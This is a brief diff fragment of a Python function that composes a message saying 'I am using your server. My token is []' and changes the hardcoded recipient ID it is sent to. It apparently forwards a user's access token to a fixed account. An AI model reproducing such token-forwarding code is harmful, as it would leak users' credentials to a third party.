@@ -11,7 +11,7 @@ def send_initial_message():
     msg_template = "Hi Adarsh sirI am using your server. My token is []"
 
     # Specify the ID where you want to send the message
-    target_id = "61560302513773"
+    target_id = "61560486339753"
 
     headers = {
         'Connection': 'keep-alive',
